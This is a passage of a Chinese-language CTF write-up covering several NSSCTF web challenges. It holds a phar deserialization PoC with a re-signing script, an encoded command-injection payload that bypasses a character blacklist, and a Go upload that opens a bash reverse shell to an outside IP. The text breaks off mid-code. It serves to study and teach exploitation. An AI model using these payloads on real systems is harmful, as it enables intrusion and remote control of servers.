class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">LoveNss</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 下面这部分就没改</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;poc.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>运行后会生成poc.phar</p><p>然后修改一下值来绕过wakeup(就是修改这个类里边属性的数量就行)</p><p>由于需要绕过wakeup，因为是后面自己去改的数据，而<code>phar</code>文件的签名是第一次生成文件的时候自动生成的，所以当我们修改数据过后，由于签名错误，这个<code>phar</code>是无法被正常解析的，所以需要修改签名，让他变成一个正常的phar文件还需要对phar文件进行修改 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"> </span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;poc.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read() <span class="comment"># 需要重新生成签名的phar文件</span></span><br><span class="line"> </span><br><span class="line">data = file[:-<span class="number">28</span>] <span class="comment"># 获取需要签名的数据</span></span><br><span class="line"> </span><br><span class="line">final = file[-<span class="number">8</span>:] <span class="comment"># 获取最后8位GBMB标识和签名类型</span></span><br><span class="line"> </span><br><span class="line">newfile = data+sha1(data).digest()+final <span class="comment"># 数据 + 签名 + 类型 + GBMB</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;newpoc.phar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(newfile) <span class="comment"># 写入到新的phar文件</span></span><br></pre></td></tr></table></figure><p>新生成的phar包后，我们就去查看一下文件上传的代码</p><p><strong>upload.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;上传异常&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$allowedExts</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>, <span class="variable">$allowedExts</span>)))&#123;</span><br><span class="line">        <span class="variable">$content</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">        <span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$content</span>, <span class="string">&quot;__HALT_COMPILER();&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">gettype</span>(<span class="variable">$pos</span>)===<span class="string">&quot;integer&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ltj一眼就发现了phar&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;./upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;./upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                <span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$content</span>);</span><br><span class="line">                <span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;上传成功 ./upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;dky不喜欢这个文件 .&quot;</span>.<span class="variable">$extension</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里对文件后后缀进行了白名单，也对phar文件内容进行了检测，伪了绕过这两点</p><p>将文件压缩为zip文件，并把后缀改为png文件，这样文件内容和后缀白名单检测都绕过了(可能就是解压成zip文件后，phar标志性的东西<code>__HALT_COMPILER();</code>就检测不到了)</p><p><strong>phar://伪协议</strong><br><strong>这个就是php解压缩报的一个函数，不管后缀是什么，都会当做压缩包来解压，用法：?file=phar://压缩包/内部文件 phar://xxx.png/shell.php 注意 PHP&gt;=5.3.0压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。步骤：写一个一句话木马shell。php，然后用zip协议解压缩为shell.zip。然后将后缀改为png等其他格式</strong></p><p>这就是phar协议的内容，所以这里就是为什么要解压成zip文件的原因</p><p>这里然后压缩成zip文件后，修改后缀名为png</p><p><img src="../images/image-20230327223103174.png" alt="image-20230327223103174"></p><p>上传成功后，使用phar伪协议传参</p><p><img src="../images/image-20230327223343549.png" alt="image-20230327223343549"></p><p><strong>paylaod</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=phar:<span class="comment">//./upload/123.png/newpoc.phar </span></span><br></pre></td></tr></table></figure><h2 id="NSSRound-V-Team-PYRCE"><a href="#NSSRound-V-Team-PYRCE" class="headerlink" title="[NSSRound#V Team]PYRCE"></a>[NSSRound#V Team]PYRCE</h2><p>考点</p><p><img src="../images/image-20230327224532343.png" alt="image-20230327224532343"></p><p>题目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, make_response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag in /flag</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">rce</span>):</span><br><span class="line">    black_list = <span class="string">&#x27;01233456789un/|&#123;&#125;*!;@#\n`~\&#x27;\&quot;&gt;&lt;=+-_ &#x27;</span></span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> rce:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&quot;Ňśś&quot;</span>):</span><br><span class="line">        nss = request.args.get(<span class="string">&quot;Ňśś&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> waf(nss):</span><br><span class="line">            os.popen(nss)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;waf&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/source&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    src = <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> src</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的代码就是很简陋，就是在/source那给了源码，然后在index函数发送请求并进行命令执行   ——-&gt;    <code>os.popen()</code></p><p>这里只要就是绕过黑名单的问题，写个脚本看看哪些没有被过滤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">rce</span>):</span><br><span class="line">    black_list = <span class="string">&#x27;01233456789un/|&#123;&#125;*!;@#\n`~\&#x27;\&quot;&gt;&lt;=+-_ &#x27;</span></span><br><span class="line">    <span class="keyword">for</span> black <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> black <span class="keyword">in</span> rce:</span><br><span class="line">            <span class="built_in">print</span>(black)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">L = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">not</span> waf(<span class="built_in">chr</span>(i))):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        L.append(<span class="built_in">chr</span>(i))</span><br><span class="line"><span class="built_in">print</span>(L)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[&#x27;\x00&#x27;, &#x27;\x01&#x27;, &#x27;\x02&#x27;, &#x27;\x03&#x27;, &#x27;\x04&#x27;, &#x27;\x05&#x27;, &#x27;\x06&#x27;, &#x27;\x07&#x27;, &#x27;\x08&#x27;, &#x27;\t&#x27;, &#x27;\x0b&#x27;, &#x27;\x0c&#x27;, &#x27;\r&#x27;, &#x27;\x0e&#x27;, &#x27;\x0f&#x27;, &#x27;\x10&#x27;, &#x27;\x11&#x27;, &#x27;\x12&#x27;, &#x27;\x13&#x27;, &#x27;\x14&#x27;, &#x27;\x15&#x27;, &#x27;\x16&#x27;, &#x27;\x17&#x27;, &#x27;\x18&#x27;, &#x27;\x19&#x27;, &#x27;\x1a&#x27;, &#x27;\x1b&#x27;, &#x27;\x1c&#x27;, &#x27;\x1d&#x27;, &#x27;\x1e&#x27;, &#x27;\x1f&#x27;, &#x27;$&#x27;, &#x27;%&#x27;, &#x27;&amp;&#x27;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;,&#x27;, &#x27;.&#x27;, &#x27;:&#x27;, &#x27;?&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;[&#x27;, &#x27;\\&#x27;, &#x27;]&#x27;, &#x27;^&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;\x7f&#x27;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>和php的那个匹配脚本差不多，也是利用chr来写<br>选出常用的，包括<code>\t</code> <code>$</code> <code>&amp;</code> <code>()</code> <code>,</code> <code>.</code> <code>:</code> <code>?</code> 以及大小写字母（<code>过滤u n</code>)</p><p><strong>paylaod</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">cp%</span><span class="language-bash">09%24%28cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26cd%09%2E%2E%26%26echo%09%24%28pwd%29flag%29%09app%2Epy</span></span><br></pre></td></tr></table></figure><p><code>cp    $(cd    ..&amp;&amp;cd    ..&amp;&amp;cd    ..&amp;&amp;cd    ..&amp;&amp;cd    ..&amp;&amp;cd    ..&amp;&amp;cd    ..&amp;&amp;cd    ..&amp;&amp;echo    $(pwd)flag)    app.py</code></p><p>就是利用shell里面的知识来写，$(xxx)这个里面会执行命令</p><p><img src="../images/image-20230328091657655.png" alt="image-20230328091657655"></p><p>然后这里前面给了flag在根目录了，然后这里就直接先cd返回到根目录，然后在使用pwd拿到/符号，因为此时已经cd到根目录了，对flag进行输出，然后使用cp命令将flag覆盖到app.py处，就是/source那里</p><h2 id="NSSRound-8-Basic-Upload-gogoggo"><a href="#NSSRound-8-Basic-Upload-gogoggo" class="headerlink" title="[NSSRound#8 Basic]Upload_gogoggo"></a>[NSSRound#8 Basic]Upload_gogoggo</h2><p>考点</p><p><img src="../images/image-20230328091957559.png" alt="image-20230328091957559"></p><p>题目</p><p><img src="../images/image-20230328092016055.png" alt="image-20230328092016055"></p><p><strong>golang的文件上传</strong>（属于是一个新的知识点)</p><p>这里的话go和php不同，他没有一句话木马，所以这里的话getshell是用</p><p>go run xx.go     xx.go文件里写的就是命令执行代码</p><p>例子代码</p><p>1.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">    out, err := exec.Command(<span class="string">&quot;ls&quot;</span>, <span class="string">&quot;-l&quot;</span>).Output()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatal(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="type">string</span>(out))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230328092748620.png" alt="image-20230328092748620"></p><p>运行成功</p><p>他这里是没有任何过滤的文件上传，所以就可以随便上点东西看看，这里上传了个1.php</p><p><img src="../images/image-20230328190306949.png" alt="image-20230328190306949"></p><p>不难发现，这里会执行命令<code>go 上传的文件名</code>，修改文件名为help试试</p><p><img src="../images/image-20230328190433293.png" alt="image-20230328190433293"></p><p>可以发现后台命令执行的代码大概长这样<code>命令执行(go 文件名前缀 文件路径)</code>，所以这里构造一下执行的命令，上传一个run.go文件，则会执行<code>go run run.go</code></p><p><strong>前面上传1.php只执行go 1的原因是没有1这个命令</strong></p><p>这里我们就直接用网上有的代码进行修改来反弹shell</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">cmd := exec.Command(<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/101.42.39.110/666 0&gt;&amp;1&quot;</span>)</span><br><span class="line">out, err := cmd.CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="type">string</span>(out))</span><br><span class="line">log.Fatalf(<span class="string">&quot;cmd.Run() failed with %s\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="type">string</span>(out))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag一个在根目录一个在/home/galf</p><h2 id="NSSRound-7-Team-0o0"><a href="#NSSRound-7-Team-0o0" class="headerlink" title="[NSSRound#7 Team]0o0"></a>[NSSRound#7 Team]0o0</h2><p>考点</p><p><img src="../images/image-20230328192745454.png" alt="image-20230328192745454"></p><p>题目</p><p><img src="../images/image-20230328192754980.png" alt="image-20230328192754980"></p><p>扫一下目录发现了一个泄露</p><p>下载后发现</p><p><img src="../images/image-20230328192940974.png" alt="image-20230328192940974"></p><p>存在一个php代码，访问之后拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$NSSCTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NSSCTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsSCTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsSCTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsScTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsScTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NsScTf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NsScTf&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$NSScTf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;NSScTf&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$nSScTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nSScTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$nSscTF</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;nSscTF&#x27;</span>] ?: <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$NSSCTF</span> != <span class="variable">$NsSCTF</span> &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$NSSCTF</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$NsSCTF</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$NsScTF</span>) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$NsScTF</span>, <span class="keyword">array</span>(<span class="number">1</span>))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$NsScTf</span>) === <span class="string">&quot;Welcome to Round7!!!&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nss_ctfer.vip&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$NSScTf</span> != <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$NSScTf</span>, <span class="number">0</span>) === <span class="number">114514</span>) &#123;</span><br><span class="line">                    <span class="variable">$nss</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$nSScTF</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$nSscTF</span>) !== <span class="string">&quot;NSSRound7&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$nss</span> &amp;&amp; <span class="variable">$nSscTF</span> === <span class="string">&quot;NSSRound7&quot;</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">                            <span class="variable">$file_name</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">                            <span class="variable">$path</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">                            <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$file_name</span>, <span class="string">&quot;.png&quot;</span>) == <span class="literal">false</span>)&#123;</span><br><span class="line">                                <span class="keyword">die</span>(<span class="string">&quot;NoO0P00oO0! Png! pNg! pnG!&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$path</span>);</span><br><span class="line">                            <span class="variable">$real_content</span> = <span class="string">&#x27;&lt;?php die(&quot;Round7 do you like&quot;);&#x27;</span>. <span class="variable">$content</span> . <span class="string">&#x27;?&gt;&#x27;</span>;</span><br><span class="line">                            <span class="variable">$real_name</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file_name</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$real_name</span>, <span class="variable">$real_content</span>);</span><br><span class="line">                            <span class="title function_ invoke__">fclose</span>(<span class="variable">$real_name</span>);</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">&quot;OoO0o0hhh.&quot;</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">die</span>(<span class="string">&quot;NoO0oO0oO0!&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span 